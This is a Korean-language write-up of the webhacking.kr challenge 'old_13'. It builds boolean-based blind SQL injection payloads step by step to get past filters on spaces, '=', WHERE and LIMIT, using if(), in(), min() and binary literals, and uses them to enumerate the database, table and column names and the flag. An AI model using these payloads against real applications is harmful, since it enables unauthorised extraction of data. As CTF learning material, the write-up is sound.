## old_13



![chrome_KWeFLMHC9D](https://user-images.githubusercontent.com/79683414/145674374-a0c31535-c703-4994-afbb-19e9d0cff6f6.png)

<br>

필터링을 검사해본 결과 아래와 같이 필터링이 적용되어 있었다.

filter : 문자열, union, #, *, limit, like, 논리/비교연산자, +, -, 공백문자, where ...etc

<br>

문제 풀이에 앞서 이번 문제에서 사용되는 Trick 을 먼저 살펴보자.

아래는 SQL 인젝션 문제에 통상적으로 이용되는 쿼리의 예이다.

__SELECT table_name FROM information_schema.tables WHERE table_schema="chall13";__

<br>

하지만 문제에서 `=, where` 를 필터링 하므로 위의 쿼리를 조금 변형해야 한다.

여기서 사용할 것은 if() 와 in() 이다.

- if(조건문, 참일 때 값, 거짓일 때 값)
- in(A,B,C...)

<br>

if 는 조건문에 따라 값을 반환한다.

in 은 조건문에서 사용되는 연산인데 아래의 예시를 보는 것이 빠르다.

```
...WHERE a=1 OR a=2

...WHERE a in (1,2)
```

<br>

if() 와 in() 을 사용하면 처음 쿼리의 `WHERE, =` 를 대체할 수 있다.

__SELECT flag FROM chall13 WHERE no=1;__

`WHERE` 대체 :  SELECT __if(no=1,flag,0)__ FROM chall13;

`=` 대체 : SELECT if(__(no)in(1)__,flag,0) FROM chall13;

<br>

대체할 수 있다고 했지만 위 두 쿼리는 결과값이 살짝 다르다.

테스트를 위해 간단하게 테이블을 만들었다.

![vmware_BYjwKGLEiC](https://user-images.githubusercontent.com/79683414/145996161-8a75fea7-23d0-47b3-a3a5-35ec62a214d6.png)

<br>

LAB 데이터베이스안에 CHALL13 과 TEST 테이블이 존재한다.

결과값이 다르다고 언급했는데 두 쿼리를 직접 입력해보자.

<br>

![vmware_9hh7XJutCF](https://user-images.githubusercontent.com/79683414/146128001-a3dda0ca-2408-4a9f-8831-da5c8fde1020.png)

<br>

2번 째 쿼리는 조건문을 만족하지 않는 결과를 0으로 출력하고 있다.

1번 쿼리는 where 조건에 해당하는 결과만 반환하지만,

2번 쿼리는 if() 의 모든 결과를 출력한다.

이 점을 유의해서 문제 풀이를 진행하자.

<br>

---

submit의 결과 값으로는 1, true 가 '1' 이고 나머지는 '0'이다.

![vmware_kUQHsFWxB1](https://user-images.githubusercontent.com/79683414/145983393-3231d240-6803-4458-9d3c-ecbd40305cb1.png)
![DXDm5ptq1m](https://user-images.githubusercontent.com/79683414/145983403-2ced1715-dde4-4a97-86d2-ff693d217614.png)
![7U1IYwMCkN](https://user-images.githubusercontent.com/79683414/145983408-e2fdcefd-3c61-476f-98ba-f7142e417ffc.png)
![mKnbjwMvDT](https://user-images.githubusercontent.com/79683414/145983415-e3532715-3926-405b-86cd-8e6196a8426a.png)

<br>

최종적으로 Submit 되는 값을 1 또는 0 으로 설정하면

Boolean Based SQL Injection 이 가능하다.

<br>

## 데이터 베이스 이름

- if(length(database())in(<입력>),1,0)

  <입력> 값을 대입하여 데이터베이스명의 길이를 알아낸다.

- if(ord(substr(database(),1,1))in(<입력>),1,0)

  substr(string,start,offset)을 이용하여 데이터베이스 명을 1글 자씩 알아낸다.

  if((substr(database(),1,1))in("c"),1,0)은 문자열이 필터링되므로 쓸 수 없다.

  result : 99, 104, 97, 108, 108, 49, 51 ("chall13")

결과는 이전 문제들에서 유추할 수 있는  `chall13`  이었다.

<br>

## 테이블 개수

__if((select(count(if((table_schema)in(database()),table_name,null)))from(information_schema.tables))in(2),1,0)__

위는 테이블의 개수를 알아내기 위한 문장이다. 어떻게 만들어졌는지 단계별로 정리해봤다.

<br>

아래는 테이블을 찾기 위해 통상적으로 이용되는 쿼리이다.

__SELECT table_name FROM information_schema.tables WHERE table_schema="chall13"__

데이터베이스 이름이 "chall13" 인 테이블을 검색하는 쿼리이다. database() 로 해도 무관하다.

<br>

필터링을 우회하기 위해, 기본 틀은 아래와 같다. 공백이 필터링 되므로 `()`을 이용한다.

__SELECT(if(,,))FROM(information_schema.tables);__

WHERE 조건을 추가해주면,

__SELECT(if(table_schema="chall13",table_name,0))FROM(information_schema.tables);__

`=` 은 필터링 되므로 in() 으로 바꿔준다.

__SELECT(if((table_schema)in("chall13"),table_name,0))FROM(information_schema.tables);__

<br>

![vmware_owpSQlVbmc](https://user-images.githubusercontent.com/79683414/146135742-8098a1db-22dd-4d55-805e-72f1dcbe7afb.png)

테스트를 위해 실제로 입력하면 위와 같은 결과가 나온다. 개수를 세기 위해 count 를 쿼리에 추가해주자. 괄호의 위치를 주의해야한다.

<br>

SELECT __(count__ (if((table_schema)in("chall13"),table_name,0)) __)__ FROM(information_schema.tables);

<br>

![vmware_4hJmJXlgOo](https://user-images.githubusercontent.com/79683414/146138038-9b5a5eaf-dfde-49ab-935b-4fa7b96e8224.png)

0까지 모두 Count 되기 때문에 193 이라는 결과가 나왔다. 그렇다면 if 문에서 0 을 null 로 바꿔주자.

SELECT(count(if((table_schema)in("chall13"),table_name, __null__ )))FROM(information_schema.tables);

<br>

![vmware_A5VAZLTO9O](https://user-images.githubusercontent.com/79683414/146138278-aade33d0-7ec0-4e5a-89ba-527afc92c028.png)

<br>

Boolean Injection 을 위해 위의 쿼리를 조건문에 한번 더 감싸주어야한다.

<br>

if((위의 쿼리)in(<입력>),1,0)

<br>

이렇게 하면 처음의 쿼리가 나온다.

__if((select(count(if((table_schema)in(database()),table_name,null)))from(information_schema.tables))in(2),1,0)__

문제에 직접 입력해보자.

<br>

![vmware_tAWfAaMSze](https://user-images.githubusercontent.com/79683414/146139774-4d039dfb-af3f-4afa-afeb-f2efa330c88e.png)

<br>

결과가 참 이므로, 테이블이 2개 존재한다.

Limit 을 사용하면 1개씩 순차적으로 내려가면서 이름을 알아낼 수 있지만 필터링 되므로 min/max 를 사용해준다.

count 자리에 min을 입력해보자.

<br>

SELECT(min(if((table_schema)in(database()),table_name,null)))FROM(information_schema.tables)

<br>

![vmware_GHcg5YOMck](https://user-images.githubusercontent.com/79683414/146140284-a5391378-16c6-4d5d-80be-d31170da3ec3.png)

<br>

문제에서는 2테이블 중 하나가 선택될 것이다.

이제 substr() 을 이용해 테이블 명을 GET 해보자.

큰 틀은 아래와 같다. substr 의 인덱스는 0 이아니라 1부터 시자한다는 점을 유의하자.

~~limit 는 0 부터 시작하는데... 통일 좀 했으면...~~

<br>

## 테이블 이름

if(ord(substr(위의 min 쿼리, 1,1))in(<입력>),1,0) 와 같은 형태로 만들면 된다.

괄호 위치가 상당히 복잡하니 순차적으로 해보자.

<br>

_min 쿼리_

SELECT(min(if((table_schema)in(database()),table_name,null)))FROM(information_schema.tables)

<br>

_괄호_

__(__ SELECT(min(if((table_schema)in(database()),table_name,null)))FROM(information_schema.tables) __)__

<br>

_substr_

__substr(__ SELECT(min(if((table_schema)in(database()),table_name,null)))FROM(information_schema.tables) __)__

<br>

_ord, in_

__ord(__ substr(SELECT(min(if((table_schema)in(database()),table_name,null)))FROM(information_schema.tables)) __)in(<입력>)__

<br>

_if_

__if(__ ord(substr(SELECT(min(if((table_schema)in(database()),table_name,null)))FROM(information_schema.tables)))in(<입력>) __,1,0)__

<br>

_완성_

__if(ord(substr((SELECT(min(if((table_schema)in(database()),table_name,null)))FROM(information_schema.tables)),1,1))in(102),1,0)__

![vmware_hRdR5ZYXQe](https://user-images.githubusercontent.com/79683414/146151398-42c29031-883c-43ca-969a-1a86622514f8.png)

<br>

## 컬럼 이름

__SELECT column_name from information_schema.columns WHERE table_name='<테이블 이름>'__;

<br>

위의 쿼리를 이전의 경험을 살려 아래와 같이 바꿀 수 있다.

<br>

__select(if((table_name)in(<테이블이름>), column_name, null))from(information_schema.columns);__

<br>

![vmware_ZcgiwNwN7c](https://user-images.githubusercontent.com/79683414/146157669-ac65edf6-a71b-4ca7-ac55-72aee7375545.png)

<br>

- Column 수

  if((select(count(if((table_name)in('FLAG_AB733768'),column_name,null)))from(information_schema.columns))in(1),1,0)

  "FLAG_AB733768"는 필터링 되므로 바이너리로 바꾸어 준다.
  
  =0b01000110010011000100000101000111010111110100000101000010001101110011001100110011001101110011011000111000
  
  __if((select(count(if((table_name)in(0b01000110010011000100000101000111010111110100000101000010001101110011001100110011001101110011011000111000),column_name,null)))from(information_schema.columns))in(1),1,0)__ 
  
- Column 이름

  __if(ord(substr((select(min(if((table_name)in(<테이블 이름>),column_name,null)))from(information_schema.columns)),1,1))in(<입력>),1,0)__ 

<br>

## Flag

- 튜플 개수 - SELECT count(<컬럼>) FROM <테이블>;

  __if((select(count(<컬럼>))from(<테이블>))in(<입력>),1,0)__

- 튜플 값 - SELECT min/max(<컬럼>) FROM <테이블>;





https://nalara12200.tistory.com/14
